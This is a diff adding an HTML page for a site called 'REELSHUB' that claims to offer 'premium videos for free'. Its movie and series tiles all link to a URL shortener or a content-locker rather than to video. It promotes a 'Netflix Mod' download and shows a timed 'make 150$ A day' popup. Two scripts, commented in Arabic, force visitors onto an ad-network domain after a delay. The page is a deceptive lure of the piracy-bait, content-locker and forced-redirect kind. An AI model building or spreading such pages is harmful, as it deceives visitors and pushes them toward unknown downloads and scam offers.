@@ -1,0 +1,427 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Upcoming Movies & Series - Cinema Hub</title>
+    <meta name="description" content="Discover the full lineup of upcoming movies and series. Stay informed about all the new releases hitting theaters and streaming platforms.">
+    <meta name="keywords" content="Upcoming movies, New series, Cinema releases, TV shows, Hollywood, Bollywood, Streaming, Netflix, Amazon Prime">
+    <meta name="author" content="Cinema Hub">
+    <meta name="geo.region" content="US">
+    <meta name="geo.placename" content="Los Angeles">
+    <meta name="geo.position" content="34.0522;-118.2437">
+    <meta name="ICBM" content="34.0522, -118.2437">
+    <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;700&display=swap" rel="stylesheet">
+    
+         
+    <style>
+        body {
+            font-family: 'Roboto', sans-serif;
+            background: #1c1c1c;
+            color: #fff;
+            margin: 0;
+            padding: 0;
+        }
+        header {
+            background: url('cinema-bg.jpg') no-repeat center center/cover;
+            padding: 80px 20px;
+            text-align: center;
+            color: #fff;
+            position: relative;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.3);
+        }
+        header::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.5);
+        }
+        header h1 {
+            position: relative;
+            font-size: 3.5rem;
+            z-index: 1;
+            margin: 0;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 40px auto;
+            padding: 20px;
+        }
+        .section-title {
+            font-size: 2.5rem;
+            color: #ff4081;
+            border-bottom: 2px solid #ff4081;
+            padding-bottom: 10px;
+            margin-bottom: 20px;
+        }
+        .movie-series-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
+            gap: 20px;
+        }
+        .movie-series-item {
+            background-color: rgba(31, 31, 31, 0.9);
+            border-radius: 10px;
+            padding: 15px;
+            box-shadow: 0 8px 16px rgba(0, 0, 0, 0.4);
+            text-align: center;
+        }
+        .movie-series-item img {
+            width: 100%;
+            height: auto;
+            border-radius: 10px;
+            margin-bottom: 15px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+        }
+        .movie-series-item h3 {
+            font-size: 1.5rem;
+            margin: 10px 0;
+            color: #ff4081;
+        }
+        .movie-series-item p {
+            font-size: 1rem;
+            color: #e0e0e0;
+            margin-bottom: 15px;
+        }
+        .watch-button, .download-button {
+            display: inline-block;
+            padding: 10px 20px;
+            background-color: #ff4081;
+            color: #fff;
+            font-size: 1.1rem;
+            font-weight: bold;
+            text-decoration: none;
+            border-radius: 20px;
+            transition: background-color 0.3s ease, transform 0.3s ease;
+            box-shadow: 0 6px 12px rgba(0, 0, 0, 0.3);
+            text-align: center;
+            background: linear-gradient(45deg, #ff6ec4, #ff4081);
+        }
+        .download-button {
+            background-color: #4285f4;
+            background: linear-gradient(45deg, #4285f4, #34a853);
+        }
+        .watch-button:hover, .download-button:hover {
+            transform: translateY(-5px);
+        }
+        footer {
+            text-align: center;
+            padding: 20px;
+            background-color: #1c1c1c;
+            margin-top: 40px;
+            box-shadow: 0 -4px 6px rgba(0, 0, 0, 0.2);
+        }
+        footer p {
+            margin: 0;
+            font-size: 1rem;
+            color: #999;
+        }
+        /* Popup CSS */
+        .popup {
+            display: none;
+            position: fixed;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            width: 300px;
+            padding: 20px;
+            background-color: rgba(31, 31, 31, 0.9);
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.4);
+            border-radius: 10px;
+            z-index: 1000;
+            text-align: center;
+        }
+        .popup h3 {
+            color: #ff4081;
+            margin-bottom: 10px;
+        }
+        .popup p {
+            color: #e0e0e0;
+            margin-bottom: 20px;
+        }
+        .popup a {
+            color: #ff4081;
+            text-decoration: none;
+            font-weight: bold;
+        }
+        .popup-close {
+            display: inline-block;
+            margin-top: 20px;
+            padding: 10px 20px;
+            background-color: #ff4081;
+            color: #fff;
+            font-size: 1rem;
+            text-decoration: none;
+            border-radius: 20px;
+            cursor: pointer;
+        }
+        .search-container {
+            display: flex;
+            justify-content: center;
+            margin: 20px 0;
+        }
+        #search-input {
+            width: 70%;
+            padding: 10px;
+            font-size: 1rem;
+            border-radius: 5px 0 0 5px;
+            border: 1px solid #ff4081;
+            background: #2c2c2c;
+            color: #fff;
+            border-right: none;
+            outline: none;
+        }
+        #search-button {
+            padding: 10px 20px;
+            font-size: 1rem;
+            border: 1px solid #ff4081;
+            border-radius: 0 5px 5px 0;
+            background-color: #ff4081;
+            color: #fff;
+            cursor: pointer;
+            outline: none;
+        }
+        #search-button:hover {
+            background-color: #e0356f;
+        }
+       /* styles.css */
+@media (max-width: 1024px) {
+    body {
+        overflow-x: hidden; /* إخفاء التمرير الأفقي */
+    }
+}
+
+ </style>
+</head>
+<body>
+    <header>
+    
+      
+        <h1>REELSHUB</h1>
+        <h3>premium videos for free 🍜🍻</h3>
+   
+    </header>
+            <div class="search-container">
+            <input type="text" id="search-input" placeholder="Search...">
+            <button id="search-button">Search</button>
+        </div>
+   
+
+    <div class="container">
+        <section>
+            <h2 class="section-title">Trending </h2>
+            <div class="movie-series-grid">
+                <!-- 2020 -->
+                <div class="movie-series-item">
+                    <img src="11.jpg" alt="Soul">
+                    <h3></h3>
+                  
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="1.jpg" alt="Tenet">
+                    <h3> </h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="2.jpg" alt="Tenet">
+                    <h3> </h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <!-- 2021 -->
+                <div class="movie-series-item">
+                    <img src="3.jpg" alt="Spider-Man: No Way Home">
+                    <h3></h3>
+                   
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="4.jpg" alt="Dune">
+                    <h3></h3>
+                   
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <!-- 2022 -->
+                <div class="movie-series-item">
+                    <img src="5.jpg" alt="Everything Everywhere All at Once">
+                    <h3></h3>
+                    
+                    <a href="://contentlocked.net/cl/i/996nkw" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="6.jpg" alt="Top Gun: Maverick">
+                    <h3></h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <!-- 2023 -->
+                <div class="movie-series-item">
+                    <img src="7.jpg" alt="Barbie">
+                    <h3></h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="8.jpg" alt="Killers of the Flower Moon">
+                    <h3></h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <!-- 2024 -->
+                <div class="movie-series-item">
+                    <img src="9.jpg" alt="Fury">
+                    <h3></h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="10.jpg" alt="The goat life">
+                    <h3></h3>
+                  
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <!-- 2024 -->
+                <div class="movie-series-item">
+                    <img src="12.jpg" alt="Avengers: The Kang Dynasty">
+                    <h3></h3>
+                  
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="13.jpg" alt="Avengers: Secret Wars">
+                    <h3></h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="14.jpg" alt="Avengers: Secret Wars">
+                    <h3></h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>                       <div class="movie-series-item">
+                    <img src="15.jpg" alt="Avengers: Secret Wars">
+                    <h3> </h3>
+                    
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <h2 class="section-title">more videos </h2>
+            <div class="movie-series-grid">
+                <!-- 2024 -->
+                <div class="movie-series-item">
+                    <img src="16.jpg" alt="The Last Kingdom">
+                    <h3></h3>
+                   
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="17.jpg" alt="Mindhunter">
+                    <h3></h3>
+                   
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="18.jpg" alt="Stranger Things">
+                    <h3></h3>
+                  
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <!-- 2024 -->
+                <div class="movie-series-item">
+                    <img src="19.jpg" alt="The Witcher">
+                    <h3></h3>
+               
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                <div class="movie-series-item">
+                    <img src="21.jpg" alt="The Mandalorian">
+                    <h3></h3>
+                
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+                 <div class="movie-series-item">
+                    <img src="21.jpg" alt="The Mandalorian">
+                    <h3></h3>
+                
+                    <a href="https://smrturl.co/94355ba" class="watch-button">Watch</a>
+                </div>
+            </div>
+        </section>
+
+        <section>
+            <h2 class="section-title">Special Offers</h2>
+            <div class="movie-series-grid">
+                <div class="movie-series-item">
+                    <h3>Download Netflix Mod</h3>
+                    <p>Enjoy Netflix without a monthly subscription. Click below to download the modded version.</p>
+                    <a href="https://smrturl.co/94355ba" class="download-button">Download Now</a>
+                </div>
+            </div>
+        </section>
+    </div>
+
+    <footer>
+        <p>&copy; 2024 Cinema Hub. All Rights Reserved.</p>
+    </footer>
+
+    <!-- Popup -->
+  <!-- Popup -->
+<div class="popup" id="popup">
+    <img src="https://i.postimg.cc/T2J1rDSH/hqdefault.jpg" alt="Special Offer Image" style="width: 100%; border-radius: 10px; margin-bottom: 15px;">
+    <h3>Special Offer!</h3>
+    <p>make 150$ A day with this web site.</p>
+    <a href="https://smrturl.co/94355ba">Go to Offer</a>
+    <div class="popup-close" onclick="closePopup()">Close</div>
+</div>
+
+
+    <script>
+        // Show popup after 5 seconds
+        window.onload = function() {
+            setTimeout(function() {
+                document.getElementById('popup').style.display = 'block';
+            }, 5000);
+        };
+
+        // Close popup
+        function closePopup() {
+            document.getElementById('popup').style.display = 'none';
+        }
+    </script>
+    <script>
+  // وقت الانتظار بالثواني
+  var waitTime = 25; 
+
+  // الرابط الذي سيتم توجيه الزائر إليه
+  var redirectUrl = "https://luglawhaulsano.net/4/8456112"; // ضع هنا رابط الصفحة التي تريد توجيه الزائر إليها
+
+  // دالة لتحويل الزائر بعد مدة معينة
+  setTimeout(function() {
+    window.location.href = redirectUrl;
+  }, waitTime * 25000); // تحويل الثواني إلى ميلي ثانية
+</script>
+  </script>
+    <script>
+  // وقت الانتظار بالثواني
+  var waitTime = 20; 
+
+  // الرابط الذي سيتم توجيه الزائر إليه
+  var redirectUrl = "https://luglawhaulsano.net/4/8456112"; // ضع هنا رابط الصفحة التي تريد توجيه الزائر إليها
+
+  // دالة لتحويل الزائر بعد مدة معينة
+  setTimeout(function() {
+    window.location.href = redirectUrl;
+  }, waitTime * 25000); // تحويل الثواني إلى ميلي ثانية
+</script>
+        
+
+</body>
+</html>
